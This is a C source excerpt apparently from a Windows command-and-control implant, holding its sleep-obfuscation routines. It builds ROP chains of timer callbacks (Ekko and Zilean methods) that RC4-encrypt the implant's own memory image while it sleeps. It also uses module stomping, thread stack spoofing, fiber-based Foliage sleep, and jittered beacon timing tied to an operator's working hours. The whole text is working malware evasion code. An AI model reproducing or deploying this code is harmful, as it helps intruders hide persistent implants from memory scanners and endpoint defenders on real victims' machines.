    /* create a random key */
    for ( BYTE i = 0; i < 16; i++ ) {
        Buf[ i ] = RandomNumber32( );
    }

    //if module stomping is enabled
    if(Instance.Session.Rc4StompedModule.Buffer != NULL) {
        //Copying payload to other location
        MemCopy(Instance.Session.Rc4PayloadModule.Buffer, ImageBase, ImageSize);
        //generating random key
        for (SHORT i = 0; i < KEYSIZE; i++)
            ((PBYTE) (Instance.Session.KeyPayloadModule.Buffer))[i] = RandomNumber32();
        //encrypting copy of payload
        Instance.Win32.SystemFunction032(&(Instance.Session.Rc4PayloadModule), &(Instance.Session.KeyPayloadModule));

        //storing encrypted payload info in stack
        Key.Buffer = Instance.Session.KeyPayloadModule.Buffer;
        Key.Length = Key.MaximumLength = Instance.Session.KeyPayloadModule.Length;

        Img.Buffer = Instance.Session.Rc4PayloadModule.Buffer;
        Img.Length = Img.MaximumLength = Instance.Session.Rc4PayloadModule.Length;


        //Decrypting stomped module
        Instance.Win32.SystemFunction032(&(Instance.Session.Rc4StompedModule),&(Instance.Session.KeyStompedModule));

        //saving stomped module info in stack
        Rc4Stomped.Buffer = Instance.Session.Rc4StompedModule.Buffer;
        Rc4Stomped.Length = Instance.Session.Rc4StompedModule.Length;
        Rc4Stomped.MaximumLength = Instance.Session.Rc4StompedModule.MaximumLength;

        KeyStomped.Buffer = Instance.Session.KeyStompedModule.Buffer;
        KeyStomped.Length = Instance.Session.KeyStompedModule.Length;
        KeyStomped.MaximumLength = Instance.Session.KeyStompedModule.MaximumLength;
    }
    else {
        /* set key pointer and size */
        Key.Buffer = Buf;
        Key.Length = Key.MaximumLength = sizeof(Buf);

        /* set agent memory pointer and size */
        Img.Buffer = ImageBase = Instance.Session.ModuleBase;
        Img.Length = Img.MaximumLength = ImageSize = Instance.Session.ModuleSize;
    }
    if ( Method == SLEEPOBF_EKKO ) {
        NtStatus = Instance.Win32.RtlCreateTimerQueue( &Queue );
    } else if ( Method == SLEEPOBF_ZILEAN ) {
        NtStatus = Instance.Win32.NtCreateEvent( &EvntWait, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE );
    }
    //Instance.Win32.K32EmptyWorkingSet((HANDLE)-1);
    if ( NT_SUCCESS( NtStatus ) )
    {
        /* create events */
        if ( NT_SUCCESS( NtStatus = Instance.Win32.NtCreateEvent( &EvntTimer, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) &&
             NT_SUCCESS( NtStatus = Instance.Win32.NtCreateEvent( &EvntStart, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) &&
             NT_SUCCESS( NtStatus = Instance.Win32.NtCreateEvent( &EvntDelay, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) )
        {
            /* get the context of the Timer thread based on the method used */
            if ( Method == SLEEPOBF_EKKO ) {
                NtStatus = Instance.Win32.RtlCreateTimer( Queue, &Timer, C_PTR( Instance.Win32.RtlCaptureContext ), &TimerCtx, Delay += 100, 0, WT_EXECUTEINTIMERTHREAD );
            } else if ( Method == SLEEPOBF_ZILEAN ) {
                NtStatus = Instance.Win32.RtlRegisterWait( &Timer, EvntWait, C_PTR( Instance.Win32.RtlCaptureContext ), &TimerCtx, Delay += 100, WT_EXECUTEONLYONCE | WT_EXECUTEINWAITTHREAD );
            }

            if ( NT_SUCCESS( NtStatus ) )
            {
                /* Send event that we got the context of the timers thread */
                if ( Method == SLEEPOBF_EKKO ) {
                    NtStatus = Instance.Win32.RtlCreateTimer( Queue, &Timer, C_PTR( EventSet ), EvntTimer, Delay += 100, 0, WT_EXECUTEINTIMERTHREAD );
                } else if ( Method == SLEEPOBF_ZILEAN ) {
                    NtStatus = Instance.Win32.RtlRegisterWait( &Timer, EvntWait, C_PTR( EventSet ), EvntTimer, Delay += 100, WT_EXECUTEONLYONCE | WT_EXECUTEINWAITTHREAD );
                }

                if ( NT_SUCCESS( NtStatus ) )
                {
                    /* wait til we successfully retrieved the timers thread context */
                    if ( ! NT_SUCCESS( NtStatus = SysNtWaitForSingleObject( EvntTimer, FALSE, NULL ) ) ) {
                        PRINTF( "Failed waiting for starting event: %lx\n", NtStatus )
                        goto LEAVE;
                    }

                    /* if stack spoofing is enabled then prepare some stuff */
                    if ( Instance.Config.Implant.StackSpoof )
                    {
                        /* retrieve Tib if stack spoofing is enabled */
                        if ( ! ThreadQueryTib( C_PTR( TimerCtx.Rsp ), &NtTib ) ) {
                            PUTS( "Failed to retrieve Tib" )
                            goto LEAVE;
                        }

                        /* duplicate the current thread we are going to spoof the stack */
                        if ( ! NT_SUCCESS( NtStatus = SysNtDuplicateObject( NtCurrentProcess(), NtCurrentThread(), NtCurrentProcess(), &ThdSrc, 0, 0, DUPLICATE_SAME_ACCESS ) ) ) {
                            PRINTF( "NtDuplicateObject Failed: %lx\n", NtStatus )
                            goto LEAVE;
                        }

                        /* NtTib backup */
                        MemCopy( &BkpTib, &Instance.Teb->NtTib, sizeof( NT_TIB ) );
                    }

                    /* at this point we can start preparing the ROPs and execute the timers */
                    for ( int i = 0; i < 50; i++ ) {
                        MemCopy( &Rop[ i ], &TimerCtx, sizeof( CONTEXT ) );
                        Rop[ i ].Rsp -= sizeof( PVOID );
                    }

                    /* set specific context flags */
                    ThdCtx.ContextFlags   = CONTEXT_FULL;
                    TimerCtx.ContextFlags = CONTEXT_FULL;

                    /* Start of Ropchain */
                    Rop[ Inc ].Rip = U_PTR( Instance.Win32.WaitForSingleObjectEx );
                    Rop[ Inc ].Rcx = U_PTR( EvntStart );
                    Rop[ Inc ].Rdx = U_PTR( INFINITE );
                    Rop[ Inc ].R8  = U_PTR( FALSE );
                    Inc++;

                    //If Module Stomping is enabled
                    if(Rc4Stomped.Buffer != NULL){
                        /* Protect */
                        Rop[ Inc ].Rip = U_PTR( Instance.Win32.VirtualProtect );
                        Rop[ Inc ].Rcx = U_PTR( ImageBase );
                        //TODO: replace ImageSize with Rc4Stomped.Length
                        Rop[ Inc ].Rdx = U_PTR( Rc4Stomped.Length );
                        Rop[ Inc ].R8  = U_PTR( PAGE_READWRITE );
                        Rop[ Inc ].R9  = U_PTR( &Value );
                        Inc++;

                        /*Copy back stomped module*/
                        Rop[ Inc ].Rip = U_PTR( Instance.Win32.RtlCopyMappedMemory );
                        Rop[ Inc ].Rcx = U_PTR( ImageBase );
                        Rop[ Inc ].Rdx = U_PTR( Rc4Stomped.Buffer );
                        //TODO: replace ImageSize with Rc4Stomped.Length
                        Rop[ Inc ].R8  = U_PTR( Rc4Stomped.Length );
                        Inc++;

                        /*Encrypt copy of stomped module*/
                        Rop[ Inc ].Rip = U_PTR( Instance.Win32.SystemFunction032 );
                        Rop[ Inc ].Rcx = U_PTR( &Rc4Stomped );
                        Rop[ Inc ].Rdx = U_PTR( &KeyStomped );
                        Inc++;

                        /*Restore stomped module pages to RX*/
                        Rop[ Inc ].Rip = U_PTR( Instance.Win32.VirtualProtect );
                        Rop[ Inc ].Rcx = U_PTR( ImageBase );
                        //TODO: replace ImageSize with Rc4Stomped.Length
                        Rop[ Inc ].Rdx = U_PTR( Rc4Stomped.Length );
                        Rop[ Inc ].R8  = U_PTR( PAGE_EXECUTE_READ );
                        Rop[ Inc ].R9  = U_PTR( &Value );
                        Inc++;
                    }
                    else{
                        /* Protect */
                        Rop[ Inc ].Rip = U_PTR( Instance.Win32.VirtualProtect );
                        Rop[ Inc ].Rcx = U_PTR( ImageBase );
                        Rop[ Inc ].Rdx = U_PTR( ImageSize );
                        Rop[ Inc ].R8  = U_PTR( PAGE_READWRITE );
                        Rop[ Inc ].R9  = U_PTR( &Value );
                        Inc++;

                        /* Encrypt image base address */
                        Rop[ Inc ].Rip = U_PTR( Instance.Win32.SystemFunction032 );
                        Rop[ Inc ].Rcx = U_PTR( &Img );
                        Rop[ Inc ].Rdx = U_PTR( &Key );
                        Inc++;
                    }

                    /* perform stack spoofing */
                    if ( Instance.Config.Implant.StackSpoof ) {
                        Rop[ Inc ].Rip = U_PTR( Instance.Win32.NtGetContextThread );
                        Rop[ Inc ].Rcx = U_PTR( ThdSrc  );
                        Rop[ Inc ].Rdx = U_PTR( &ThdCtx );
                        Inc++;

                        Rop[ Inc ].Rip = U_PTR( Instance.Win32.RtlCopyMappedMemory );
                        Rop[ Inc ].Rcx = U_PTR( &TimerCtx.Rip );
                        Rop[ Inc ].Rdx = U_PTR( &ThdCtx.Rip );
                        Rop[ Inc ].R8  = U_PTR( sizeof( VOID ) );
                        Inc++;

                        Rop[ Inc ].Rip = U_PTR( Instance.Win32.RtlCopyMappedMemory );
                        Rop[ Inc ].Rcx = U_PTR( &Instance.Teb->NtTib );
                        Rop[ Inc ].Rdx = U_PTR( &NtTib );
                        Rop[ Inc ].R8  = U_PTR( sizeof( NT_TIB ) );
                        Inc++;

                        Rop[ Inc ].Rip = U_PTR( Instance.Win32.NtSetContextThread );
                        Rop[ Inc ].Rcx = U_PTR( ThdSrc    );
                        Rop[ Inc ].Rdx = U_PTR( &TimerCtx );
                        Inc++;
                    }

                    /* Sleep */
                    Rop[ Inc ].Rip = U_PTR( Instance.Win32.WaitForSingleObjectEx );
                    Rop[ Inc ].Rcx = U_PTR( NtCurrentProcess() );
                    Rop[ Inc ].Rdx = U_PTR( Delay + TimeOut );
                    Rop[ Inc ].R8  = U_PTR( FALSE );
                    Inc++;

                    /* undo stack spoofing */
                    if ( Instance.Config.Implant.StackSpoof ) {
                        Rop[ Inc ].Rip = U_PTR( Instance.Win32.RtlCopyMappedMemory );
                        Rop[ Inc ].Rcx = U_PTR( &Instance.Teb->NtTib );
                        Rop[ Inc ].Rdx = U_PTR( &BkpTib );
                        Rop[ Inc ].R8  = U_PTR( sizeof( NT_TIB ) );
                        Inc++;

                        Rop[ Inc ].Rip = U_PTR( Instance.Win32.NtSetContextThread );
                        Rop[ Inc ].Rcx = U_PTR( ThdSrc  );
                        Rop[ Inc ].Rdx = U_PTR( &ThdCtx );
                        Inc++;
                    }
                    if(Rc4Stomped.Buffer != NULL){
                        /*Decrypt copy of payload*/
                        Rop[ Inc ].Rip = U_PTR( Instance.Win32.SystemFunction032 );
                        Rop[ Inc ].Rcx = U_PTR( &Img );
                        Rop[ Inc ].Rdx = U_PTR( &Key );
                        Inc++;

                        /*Reset pages to rw*/
                        Rop[ Inc ].Rip = U_PTR( Instance.Win32.VirtualProtect );
                        Rop[ Inc ].Rcx = U_PTR( ImageBase );
                        Rop[ Inc ].Rdx = U_PTR( Rc4Stomped.Length );
                        Rop[ Inc ].R8  = U_PTR( PAGE_READWRITE );
                        Rop[ Inc ].R9  = U_PTR( &Value );
                        Inc++;

                        /*copy decrypted payload to ImageBase*/
                        Rop[ Inc ].Rip = U_PTR( Instance.Win32.RtlCopyMappedMemory );
                        Rop[ Inc ].Rcx = U_PTR( ImageBase );
                        Rop[ Inc ].Rdx = U_PTR( Img.Buffer );
                        Rop[ Inc ].R8  = U_PTR( ImageSize );
                        Inc++;
                    }
                    else {
                        /* Sys032 */
                        Rop[Inc].Rip = U_PTR(Instance.Win32.SystemFunction032);
                        Rop[Inc].Rcx = U_PTR(&Img);
                        Rop[Inc].Rdx = U_PTR(&Key);
                        Inc++;
                    }
                    /* Protect with original permissions*/
                    for (int i = 0; i < Instance.Session.NumberOfSections; i++) {
                        Rop[Inc].Rip = U_PTR(Instance.Win32.VirtualProtect);
                        Rop[Inc].Rcx = U_PTR(Instance.Session.PageProtectParams[i].SecMemory);
                        Rop[Inc].Rdx = U_PTR(Instance.Session.PageProtectParams[i].SecMemorySize);
                        Rop[Inc].R8 = U_PTR(Instance.Session.PageProtectParams[i].Protection);
                        Rop[Inc].R9 = U_PTR(&Value);
                        Inc++;
                    }
                    /* End of Ropchain */
                    Rop[ Inc ].Rip = U_PTR( Instance.Win32.NtSetEvent );
                    Rop[ Inc ].Rcx = U_PTR( EvntDelay );
                    Rop[ Inc ].Rdx = U_PTR( NULL );
                    Inc++;

                    PRINTF( "Rops to be executed: %d\n", Inc )

                    /* execute/queue the timers */
                    for ( int i = 0; i < Inc; i++ ) {
                        if ( Method == SLEEPOBF_EKKO ) {
                            if ( ! NT_SUCCESS( NtStatus = Instance.Win32.RtlCreateTimer( Queue, &Timer, C_PTR( Instance.Win32.NtContinue ), &Rop[ i ], Delay += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) {
                                PRINTF( "RtlCreateTimer Failed: %lx\n", NtStatus )
                                goto LEAVE;
                            }
                        } else if ( Method == SLEEPOBF_ZILEAN ) {
                            if ( ! NT_SUCCESS( NtStatus = Instance.Win32.RtlRegisterWait( &Timer, EvntWait, C_PTR( Instance.Win32.NtContinue ), &Rop[ i ], Delay += 100, WT_EXECUTEONLYONCE | WT_EXECUTEINWAITTHREAD ) ) ) {
                                PRINTF( "RtlRegisterWait Failed: %lx\n", NtStatus )
                                goto LEAVE;
                            }
                        }
                    }

                    /* just wait for the sleep to end */
                    if ( ! ( Success = NT_SUCCESS( NtStatus = SysNtSignalAndWaitForSingleObject( EvntStart, EvntDelay, FALSE, NULL ) ) ) ) {
                        PRINTF( "NtSignalAndWaitForSingleObject Failed: %lx\n", NtStatus );
                    } else {
                        Success = TRUE;
                    }
                } else {
                    PRINTF( "RtlCreateTimer/RtlRegisterWait Failed: %lx\n", NtStatus )
                }
            } else {
                PRINTF( "RtlCreateTimer/RtlRegisterWait Failed: %lx\n", NtStatus )
            }
        } else {
            PRINTF( "NtCreateEvent Failed: %lx\n", NtStatus )
        }
    } else {
        PRINTF( "RtlCreateTimerQueue/NtCreateEvent Failed: %lx\n", NtStatus )
    }


LEAVE: /* cleanup */
    //Instance.Win32.K32EmptyWorkingSet((HANDLE)-1);
    if ( Queue ) {
        Instance.Win32.RtlDeleteTimerQueue( Queue );
        Queue = NULL;
    }

    if(Instance.Session.Rc4PayloadModule.Buffer != NULL){
        RtlSecureZeroMemory(Instance.Session.Rc4PayloadModule.Buffer,Instance.Session.Rc4PayloadModule.Length);
    }
    if ( EvntTimer ) {
        SysNtClose( EvntTimer );
        EvntTimer = NULL;
    }

    if ( EvntStart ) {
        SysNtClose( EvntStart );
        EvntStart = NULL;
    }

    if ( EvntDelay ) {
        SysNtClose( EvntDelay );
        EvntDelay = NULL;
    }

    if ( EvntWait ) {
        SysNtClose( EvntWait );
        EvntWait = NULL;
    }

    if ( ThdSrc ) {
        SysNtClose( ThdSrc );
        ThdSrc = NULL;
    }

    /* clear the structs from stack */
    for ( int i = 0; i < 50; i++ ) {
        RtlSecureZeroMemory( &Rop[ i ], sizeof( CONTEXT ) );
    }
    Instance.Win32.LocalFree(Rop);
    Instance.Win32.LocalFree(PageProtectParams);
    /* clear key from memory */
    RtlSecureZeroMemory( Buf, sizeof( Buf ) );

    return Success;
}

#endif

UINT32 SleepTime(
    VOID
) {
    UINT32     SleepTime    = Instance.Config.Sleeping * 1000;
    UINT32     MaxVariation = ( Instance.Config.Jitter * SleepTime ) / 100;
    ULONG      Rand         = 0;
    UINT32     WorkingHours = Instance.Config.Transport.WorkingHours;
    SYSTEMTIME SystemTime   = { 0 };
    WORD       StartHour    = 0;
    WORD       StartMinute  = 0;
    WORD       EndHour      = 0;
    WORD       EndMinute    = 0;

    if ( ! InWorkingHours() )
    {
        /*
         * we are no longer in working hours,
         * if the SleepTime is 0, then we will assume the operator is performing some "important" task right now,
         * so we will ignore working hours, and we won't sleep
         * if the SleepTime is not 0, we will sleep until we are in working hours again
         */
        if ( SleepTime )
        {
            // calculate how much we need to sleep until we reach the start of the working hours
            SleepTime = 0;

            StartHour   = ( WorkingHours >> 17 ) & 0b011111;
            StartMinute = ( WorkingHours >> 11 ) & 0b111111;
            EndHour     = ( WorkingHours >>  6 ) & 0b011111;
            EndMinute   = ( WorkingHours >>  0 ) & 0b111111;

            Instance.Win32.GetLocalTime(&SystemTime);

            if ( SystemTime.wHour == EndHour && SystemTime.wMinute > EndMinute || SystemTime.wHour > EndHour )
            {
                // seconds until 00:00
                SleepTime += ( 24 - SystemTime.wHour - 1 ) * 60 + ( 60 - SystemTime.wMinute );
                // seconds until start of working hours from 00:00
                SleepTime += StartHour * 60 + StartMinute;
            }
            else
            {
                // seconds until start of working hours from current time
                SleepTime += ( StartHour - SystemTime.wHour ) * 60 + ( StartMinute - SystemTime.wMinute );
            }
            SleepTime *= 1000;
        }
    }
    // MaxVariation will be non-zero if sleep jitter was specified
    else if ( MaxVariation )
    {
        Rand = RandomNumber32();
        Rand = Rand % MaxVariation;

        if ( RandomBool() ) {
            SleepTime += Rand;
        } else {
            SleepTime -= Rand;
        }
    }

    return SleepTime;
}

VOID SleepObf(
    VOID
) {
    UINT32 TimeOut   = SleepTime();
    DWORD  Technique = Instance.Config.Implant.SleepMaskTechnique;

    /* don't do any sleep obf. waste of resources */
    if ( TimeOut == 0 ) {
        return;
    }

#if _WIN64

    if ( Instance.Threads ) {
        PRINTF( "Can't sleep obf. Threads running: %d\n", Instance.Threads )
        Technique = 0;
    }

    switch ( Technique )
    {
        case SLEEPOBF_FOLIAGE: {
            SLEEP_PARAM Param = { 0 };

            if ( ( Param.Master = Instance.Win32.ConvertThreadToFiberEx( &Param, 0 ) ) ) {
                if ( ( Param.Slave = Instance.Win32.CreateFiberEx( 0x1000 * 6, 0, 0, C_PTR( FoliageObf ), &Param ) ) ) {
                    Param.TimeOut = TimeOut;
                    Instance.Win32.SwitchToFiber( Param.Slave );
                    Instance.Win32.DeleteFiber( Param.Slave );
                }
                Instance.Win32.ConvertFiberToThread( );
            }
            break;
        }

        /* timer api based sleep obfuscation */
        case SLEEPOBF_EKKO:
        case SLEEPOBF_ZILEAN: {
            if ( ! TimerObf( TimeOut, Technique ) ) {
                goto DEFAULT;
            }
            break;
        }

        /* default */
        DEFAULT: case SLEEPOBF_NO_OBF: {}; default: {
            SpoofFunc(
                Instance.Modules.Kernel32,
                IMAGE_SIZE( Instance.Modules.Kernel32 ),
                Instance.Win32.WaitForSingleObjectEx,
                NtCurrentProcess(),
                C_PTR( TimeOut ),
                FALSE
            );
        }
    }

#else

    // TODO: add support for sleep obf and spoofing

    Instance.Win32.WaitForSingleObjectEx( NtCurrentProcess(), TimeOut, FALSE );

#endif

}
